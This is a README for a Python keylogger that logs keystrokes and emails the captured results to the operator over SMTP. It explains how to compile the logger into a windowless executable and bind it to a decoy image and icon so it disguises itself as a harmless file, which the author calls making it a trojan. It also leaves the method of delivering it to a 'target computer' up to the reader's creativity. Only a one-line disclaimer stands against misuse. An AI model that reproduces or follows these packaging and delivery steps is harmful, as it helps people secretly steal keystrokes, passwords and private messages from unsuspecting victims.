[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

# Keylogger
A classic key logger program that logs key strokes and uses SMTP to send logged results to specified email.

## Getting Started
This should be compiled and ran as an executable (.exe) on the target computer. However you want this file to be delivered and executed on target is up to your creativity. The test_logger.py should be compiled using a 2.7 interrupter with a front file. To use the smtp reporting, use a gmail account with insecure authentication enabled. 

## Example compiling the program 
I like to attach a file and its appropriate file icon together with a malware (making it a trojan)
```C:\Python27\Scripts\pyinstaller.exe test_logger.py] --onefile --noconsole --add-data “C:/Downloads/pic.jpg;.” --icon C:/Downloads/file_name.ico```

Written in python 2.7, make sure to use the appropriate interrupter. The sample file is pic.jpg in the test_logger.py. Make sure to modify the subprocess file call to whatever front file you want to use, and reflect it in the compiler command. 

## Attention
Please do not use this program where unauthorized.

## Credits

|                                      |             |
| ------------------------------------ | ----------- |
| **Author**                           | @bryanwei   |

## License
See the [LICENSE](https://github.com/bryanweielio/Keylogger/blob/master/LICENSE) file.
